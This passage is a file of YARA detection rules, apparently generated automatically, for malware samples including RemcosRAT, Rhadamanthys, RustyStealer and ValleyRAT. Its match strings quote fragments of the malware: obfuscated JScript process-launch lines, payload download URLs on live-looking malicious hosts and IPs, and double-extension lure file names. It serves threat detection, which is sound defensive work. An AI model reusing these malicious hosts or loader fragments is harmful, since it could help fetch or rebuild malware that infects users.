      $s12 = "get_Winken_nach_Rechts" fullword ascii /* score: '9.00'*/
      $s13 = "get_TotalWords" fullword ascii /* score: '9.00'*/
      $s14 = "<GetDeletedNotes>b__11_1" fullword ascii /* score: '9.00'*/
      $s15 = "get_TagsCount" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__31a41ec3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_31a41ec3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31a41ec300e4c59521f0e3dd55191a602e20594eeac4c6c7d3c7022a90691cd2"
   strings:
      $s1 = "Nqztwc.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://primeline.it.com/pure/Wtcybqn.vdf" fullword wide /* score: '17.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "{7f8706e4-3f20-43d3-9398-ae3da170c3fc}, PublicKeyToken=3e56350693f7355e" fullword wide /* score: '13.00'*/
      $s5 = ".NET Framework 4.6(" fullword ascii /* score: '10.00'*/
      $s6 = "Selected compression algorithm is not supported." fullword wide /* score: '10.00'*/
      $s7 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s8 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s9 = "Unknown Header" fullword wide /* score: '9.00'*/
      $s10 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule ResolverRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6ce93fb7 {
   meta:
      description = "_subset_batch - file ResolverRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6ce93fb7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6ce93fb7bef42cf3ac7f4f67a150e96093022fb7592e63cb087b352ade9febbb"
   strings:
      $s1 = "Rtmtp.exe" fullword wide /* score: '22.00'*/
      $s2 = "CRtmtp, Version=1.0.6664.27540, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s5 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s8 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s9 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s10 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "get_Nndaovmhq" fullword ascii /* score: '9.00'*/
      $s12 = "* 4&BD`" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s14 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s15 = "dOgw+ j" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule RemcosRAT_signature__7fe73890 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_7fe73890.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7fe73890d1d759d4787546b61a296d3ad97d72ce95e5cc60f4c67fc68b371ed4"
   strings:
      $s1 = "var seriphidium = subnationally.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var sliverer = subnationally.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var farinaceously = ambiversions.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '22.00'*/
      $s4 = "var ambiversions = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '13.00'*/
      $s5 = "var subnationally = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var figurately = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s7 = "g(\\'' + piecrusts + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "expromissor = expromissor + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__87fcbd1f {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_87fcbd1f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87fcbd1f67359062e18c02f3a27bc8e192cf771819fd929cc8a96d884cf35f5f"
   strings:
      $s1 = "var archdevil = concionatory.Get(\"Win32_Process\");" fullword ascii /* score: '28.00'*/
      $s2 = "var adats = concionatory.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s3 = "var matchlockman = infantine.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var concionatory = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var congrogadus = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var infantine = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "var ephemerist = archdevil.Create(Offaly, matchlockman, adats, congrogadus);" fullword ascii /* score: '9.00'*/
      $s8 = "Offaly = Offaly + '" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + Debrecen + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__8d2eb5b6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8d2eb5b6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d2eb5b60fb361710d037ecad9395553bd1bfe06eda18c71c6fdd0317b0601d9"
   strings:
      $s1 = "var gallinule = myrmecobe.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var wizened = myrmecobe.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var ganglionless = mooches.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var myrmecobe = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var brewing = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var mooches = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + uncondemned + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "Octobr = Octobr + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__cfa5264d {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_cfa5264d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cfa5264d2592a1fe11fed0d39d463cd1303eb428506125cb6c180a0e4c20caf0"
   strings:
      $s1 = "var concertist = intussusceptive.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var prebendry = intussusceptive.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var ductility = skippered.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var intussusceptive = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var Molise = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var skippered = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "likehood = likehood + '" fullword ascii /* score: '8.00'*/
      $s8 = "g(\\'' + mellate + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule RemcosRAT_signature__e8caf4ce {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_e8caf4ce.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e8caf4ceab4313b405809447608a3a14e0fb99600404646b9f615b15ca8d5fcc"
   strings:
      $s1 = "var wauff = associatory.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s2 = "var electroreplica = associatory.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '22.00'*/
      $s3 = "var bombe = trendinesses.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var glaive = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var associatory = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var trendinesses = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "murrelet = murrelet + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule Rhadamanthys_signature__19b9356b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_19b9356b.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "19b9356b882b9c8b4bb04ecce04627e70cde9eaabcd8cd8ee679af0c8d31aaec"
   strings:
      $s1 = "    script.src = \"https:\\/\\/scbfile.com\\/common\\/preload.php?a=1&t=\"+ts+'&lkt=3&r='+(dref)+(l_val ? '&l_val=1' : '')+'&dat" ascii /* score: '29.00'*/
      $s2 = "    script.src = \"https:\\/\\/scbfile.com\\/common\\/preload.php?a=1&t=\"+ts+'&lkt=3&r='+(dref)+(l_val ? '&l_val=1' : '')+'&dat" ascii /* score: '24.00'*/
      $s3 = "<script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js\"></script>" fullword ascii /* score: '23.00'*/
      $s4 = "<script type=\"text/javascript\" src=\"https://scbfile.com/jquery.tipsy.js\"></script>" fullword ascii /* score: '23.00'*/
      $s5 = "Permission is granted to temporarily download one copy of the materials (information or software) on this site for personal, non" ascii /* score: '22.00'*/
      $s6 = "Permission is granted to temporarily download one copy of the materials (information or software) on this site for personal, non" ascii /* score: '22.00'*/
      $s7 = "if (target_url.search('tracking_id') == -1 && tracking_id != '' && tracking_id != null) {" fullword ascii /* score: '21.00'*/
      $s8 = "img.src = \"https://scbfile.com/common/dom_update.php?t=1756155608&lid=1788618\"+'&flags='+flags+'&intv='+setcheckintval;" fullword ascii /* score: '20.00'*/
      $s9 = "console.log( e );" fullword ascii /* score: '19.00'*/
      $s10 = "var decoded = hex_decode(encoded);" fullword ascii /* score: '18.00'*/
      $s11 = "70686e41414141" ascii /* score: '17.00'*/ /* hex encoded string 'phnAAAA' */
      $s12 = "url: \"https://scbfile.com/common/ajax_check_url.php\"," fullword ascii /* score: '17.00'*/
      $s13 = "<link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>" fullword ascii /* score: '17.00'*/
      $s14 = "<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css\" integrity=\"sha512-K" ascii /* score: '17.00'*/
      $s15 = "var target_url = item.url;" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 90KB and
      8 of them
}

rule RustyStealer_signature__e5a7688a7a1246c8f803d1495445341d_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_e5a7688a7a1246c8f803d1495445341d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d5e20fc37dd77dd0360fd32446799978048a2c60e036dbfbf5e671333ebd81f1"
   strings:
      $s1 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '27.00'*/
      $s2 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '27.00'*/
      $s3 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\raw_vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s4 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\exact_size.rs" fullword ascii /* score: '24.00'*/
      $s5 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\char\\methods.rs" fullword ascii /* score: '24.00'*/
      $s6 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\iter\\traits\\iterator.rs" fullword ascii /* score: '24.00'*/
      $s7 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\mod.rs" fullword ascii /* score: '24.00'*/
      $s8 = "internal error: entered unreachable codeC:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\error\\re" ascii /* score: '24.00'*/
      $s9 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\string.rs" fullword ascii /* score: '24.00'*/
      $s10 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\sync\\atomic.rs" fullword ascii /* score: '24.00'*/
      $s11 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\ffi\\c_str.rs" fullword ascii /* score: '24.00'*/
      $s12 = "internal error: entered unreachable codeC:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\std\\src\\io\\error\\re" ascii /* score: '24.00'*/
      $s13 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\vec\\mod.rs" fullword ascii /* score: '24.00'*/
      $s14 = "C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\core\\src\\slice\\memchr.rs" fullword ascii /* score: '24.00'*/
      $s15 = "assertion failed: self.is_char_boundary(new_len)C:\\Users\\sunwoo\\Desktop\\ollvm-project\\rust-1.88.0\\library\\alloc\\src\\str" ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule RustyStealer_signature__e13e81e2770dde23350136d77ccd510f_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_e13e81e2770dde23350136d77ccd510f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24ee0bdb2692d45c41c7f6b8cfd47e31546c8d04278e23463bf0a8629a99137f"
   strings:
      $s1 = "http://178.16.53.7//bot.exe" fullword wide /* score: '27.00'*/
      $s2 = "http://178.16.53.7/DD.exe" fullword wide /* score: '27.00'*/
      $s3 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s4 = "Document.pdf.exe" fullword wide /* score: '22.00'*/
      $s5 = "Photo.jpg.exe" fullword wide /* score: '22.00'*/
      $s6 = "icon=shell32.dll,4" fullword ascii /* score: '21.00'*/
      $s7 = "open=Update.exe" fullword ascii /* score: '19.00'*/
      $s8 = "DfIl%d.exe" fullword wide /* score: '19.00'*/
      $s9 = "\\AppData\\Roaming\\" fullword wide /* score: '15.00'*/
      $s10 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s11 = "\\Temporary Internet Files\\" fullword wide /* score: '12.00'*/
      $s12 = "Documents Backup.lnk" fullword wide /* score: '11.00'*/
      $s13 = "\\AppData\\LocalLow\\" fullword wide /* score: '11.00'*/
      $s14 = "Double-click to view contents" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule ValleyRAT_signature__d607b6016ada8a0c4e36ad1a81373ee4_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_d607b6016ada8a0c4e36ad1a81373ee4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b5a4aca8b7ebc7955918ae9ac4f152b585158712970f3bc681ab2a5c53778ca"
   strings:
      $x1 = "C:\\Users\\Public\\Pictures\\WindowsData\\bypass.exe" fullword wide /* score: '46.00'*/
      $x2 = "C:\\Users\\Public\\Documents\\WindowsData\\NVIDIA.exe" fullword ascii /* score: '38.00'*/
      $x3 = "C:\\Users\\Public\\Pictures\\WindowsData\\NVIDIA.exe" fullword wide /* score: '38.00'*/
      $x4 = "C:\\Users\\Public\\Pictures\\WindowsData\\main.exe 2" fullword ascii /* score: '34.00'*/
      $x5 = "C:\\Users\\Public\\Pictures\\WindowsData\\main.exe 1" fullword ascii /* score: '34.00'*/
      $x6 = "C:\\Users\\Public\\Pictures\\WindowsData\\NtHandleCallback.exe" fullword ascii /* score: '34.00'*/
      $x7 = "C:\\Users\\Public\\Pictures\\WindowsData\\windows.log" fullword wide /* score: '34.00'*/
      $s8 = "wdc.dll" fullword ascii /* reversed goodware string 'lld.cdw' */ /* score: '30.00'*/
      $s9 = "C:\\Users\\Public\\Pictures\\WindowsData\\X.vbe" fullword wide /* score: '30.00'*/
      $s10 = "C:/Users/Public/Pictures/WindowsData/tree.exe" fullword wide /* score: '30.00'*/
      $s11 = "C:/Users/Public/Pictures/WindowsData/kail.exe" fullword wide /* score: '30.00'*/
      $s12 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '28.00'*/
      $s13 = "C:/Users/Public/Pictures/WindowsData/NtHandleCallback.exe" fullword wide /* score: '26.00'*/
      $s14 = "bypass.exeSDg" fullword ascii /* score: '22.00'*/
      $s15 = "bypass.exeSD" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule SparkRAT_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash_ {
   meta:
      description = "_subset_batch - file SparkRAT(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fca567acf226af9195057fc6d1b7879462a84347bbec8bb66a7d83a77842a15"
   strings:
      $s1 = "MNOPQR" fullword ascii /* reversed goodware string 'RQPONM' */ /* score: '13.50'*/
      $s2 = "DuMPe8" fullword ascii /* score: '12.00'*/
      $s3 = "xeXeCOK" fullword ascii /* score: '12.00'*/
      $s4 = "vKTMA\\EXEC" fullword ascii /* score: '12.00'*/
      $s5 = "333333i" fullword ascii /* reversed goodware string 'i333333' */ /* score: '11.00'*/
      $s6 = "TYDD.saG" fullword ascii /* score: '10.00'*/
      $s7 = "ilrz.ije" fullword ascii /* score: '10.00'*/
      $s8 = "\\4?%/8 ." fullword ascii /* score: '10.00'*/ /* hex encoded string 'H' */
      $s9 = "fromftps0" fullword ascii /* score: '10.00'*/
      $s10 = "lognet" fullword ascii /* score: '10.00'*/
      $s11 = "%/41/2;-+-!4*" fullword ascii /* score: '9.00'*/ /* hex encoded string 'A$' */
      $s12 = "5%6*:%=%>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
      $s13 = "2!0-3&023" fullword ascii /* score: '9.00'*/ /* hex encoded string ' 0#' */
      $s14 = "ftPob8(d" fullword ascii /* score: '9.00'*/
      $s15 = "a$>HostINISII" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      8 of them
}

rule Rhadamanthys_signature__11b5e5a8c80fad621ae3668e21759e30_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_11b5e5a8c80fad621ae3668e21759e30(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f2fe165104b2b9de2fde5c8cbeb05dc07cdc832dcb82c9849e0eff843a5cb29"
   strings:
      $s1 = "# K-.N_TG y~.K X\\.UZD].E q D.l.P.1iTyu ofSsU{ C z.4.v.t- U_I_g.7: t_jv.l e.V_L t z F S b.JUjC " fullword ascii /* score: '15.00'*/
      $s2 = "A.g+u.6*.L_CZiT.Sj g Tk.zH1=),.C_G i+;y.F_c* k_kU Sl Q z2_M.Ne.FCl.Fh v_r.l" fullword ascii /* score: '11.00'*/
      $s3 = "]:_V_G_t.x.v zX* R.s.K| L.izz.UWC_l_y_Gv7.U y_H_f.c} C_L DF$.P w_sumK A T.T.r.W.C.E_n.y" fullword ascii /* score: '11.00'*/
      $s4 = "eh_p=.V F.ke.j#_i\\.mdE.w_TV_mNNL Y.2_yu g?.6 f b_J.D.P gV+ E.R i W,>_U>N) d.mC dE7" fullword ascii /* score: '11.00'*/
      $s5 = "XP+_T.Gs!7_D_t C.a c L>.0~ r.Y_v.a.S.Hi_D.b PU_XZDX/$[%I_A.P_mew T l j.r H* w b.Z.P B_W_T " fullword ascii /* score: '11.00'*/
      $s6 = "$NM.i%.I.U1.h B z_g.G_H.kvq.Q_W h:} VE u qV+ Iff G Af em_HEEv&_x_b@c.A9_G v.X1-.V h.0_j.T_f_h" fullword ascii /* score: '11.00'*/
      $s7 = "P n Q p k Q vU i3D.s_uw.AC@o+ S{ YR8D G_VQMQ.G_l L?L_Tc_o u.C_qTX.g.iU.Vuu.s" fullword ascii /* score: '11.00'*/
      $s8 = " kSm x.eU X.Tl A_v.Z_v.y.nal k* TUxN_X_b_N4_q.N8.r_J~_vL.b_SA_bV4" fullword ascii /* score: '11.00'*/
      $s9 = " g.Pw A^.JEm kK~\\_De.V`_HPu.C_R} qiq.0.8.O.W_MvTT.0.8G.M vq_XHj.w- K.h_y.CN_ei.4|-" fullword ascii /* score: '11.00'*/
      $s10 = "_q!.K_N D b.5k.y/S.0_V w Y.Q.BK RCSO** c.h_c-.PeX_Vl y S/;y.U.cw.Wru+_b.cV_w ny_tV_e XM.W#_S_X" fullword ascii /* score: '11.00'*/
      $s11 = "R f_B$.atj:\\C0_b WV_P:.9_b HK_b_X_r3" fullword ascii /* score: '10.00'*/
      $s12 = "t:\\.6 Q.W_e.h.DXp nd.r.f{ J.hH.G hCm!.Y.o.7.f Ai.n(.w_xr_c4.e.2.eU j.j k_E&&_J>-q." fullword ascii /* score: '10.00'*/
      $s13 = "* K.IL_W^;4_W A.T.gB.J.s b.Z ZZd RK.W.M.R Y&{.3^_b m.z.V_Q_V_u a" fullword ascii /* score: '9.00'*/
      $s14 = " S TiRC.8.X_c:_D_l_QR= p A@.w.rT_km_A" fullword ascii /* score: '9.00'*/
      $s15 = "}.u.4{.zqj.H_b r;_k K_W_X D.R T f.x.5.g TM r_R.o.2 C L u I S.6 k,_nr.O9.d_I.M h6_P_v.SpY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature__7ccdf26f81c5c13d798e8a7ffab09084_imphash__8b96d741 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_7ccdf26f81c5c13d798e8a7ffab09084(imphash)_8b96d741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b96d7418b5d6cc0169711e903229636f8640038b6abd6bfdfdba69021cea767"
   strings:
      $s1 = "AhmNYP -s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule RustyStealer_signature__28f0a0cfb357fe553e933bf84f98aca7_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_28f0a0cfb357fe553e933bf84f98aca7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3446c814aea4dc67cddefe0629d90a89fce9f754093561ab47aa3e32db3be63c"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "www.microsoft.com0" fullword ascii /* score: '14.00'*/
      $s4 = " %%%%%%" fullword ascii /* reversed goodware string '%%%%%% ' */ /* score: '11.00'*/
      $s5 = "$%%%%%" fullword ascii /* reversed goodware string '%%%%%$' */ /* score: '11.00'*/
      $s6 = "*****$" fullword ascii /* reversed goodware string '$*****' */ /* score: '11.00'*/
      $s7 = "EyEYz?" fullword ascii /* score: '9.00'*/
      $s8 = "bbbbbbbo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule RustyStealer_signature__28f0a0cfb357fe553e933bf84f98aca7_imphash__a42f37df {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_28f0a0cfb357fe553e933bf84f98aca7(imphash)_a42f37df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a42f37df47fdbb173c7495e18128b693b087e9a3a9a2707ad7cdf18e8c2649a1"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "www.microsoft.com0" fullword ascii /* score: '14.00'*/
      $s4 = "NZTH.dGv" fullword ascii /* score: '10.00'*/
      $s5 = "6)B|{'^$>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__9f3488a2b5c66296a76a1fadde7044c6_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_9f3488a2b5c66296a76a1fadde7044c6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1babe1d289fa4d264663d9a25b10f3183f43d314cae3562a60513e1680017896"
   strings:
      $s1 = "         <requestedExecutionLevel level='requireAdministrator' uiAccess='false'/>" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3bba74cfd49abd4c1f7049d22755e831629c4921490cac52f2bf51da40135f84"
   strings:
      $s1 = "http://185.238.191.89:5554/8ee410fee01a444995e04d84d8c7f931_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__3f937a77 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_3f937a77.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3f937a7720a54b3ad3bc117f7d2e3263ed0ac02a4b599068daeba19e1752c239"
   strings:
      $s1 = "http://185.238.191.89:5554/13bd6e1841f64129bd09508e978d918c_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Rhadamanthys_signature__1a2c6c953a3c96df6769899324d1ff90_imphash__8564679e {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1a2c6c953a3c96df6769899324d1ff90(imphash)_8564679e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8564679e9d6496c632214d21c8f3357936f5f5fa47226d6f770ad6889bdaf27b"
   strings:
      $s1 = "http://185.238.191.89:5554/06e45dfe762042d69e25b91371200293_build.bin" fullword ascii /* score: '18.00'*/
      $s2 = ":&:4:;:A:^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s3 = "2,252>2[3" fullword ascii /* score: '9.00'*/ /* hex encoded string '"R#' */
      $s4 = "log entry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1400501f {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1400501f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1400501f3ddee860812351230decc4734e48e809b460894f4cf34d153e65b015"
   strings:
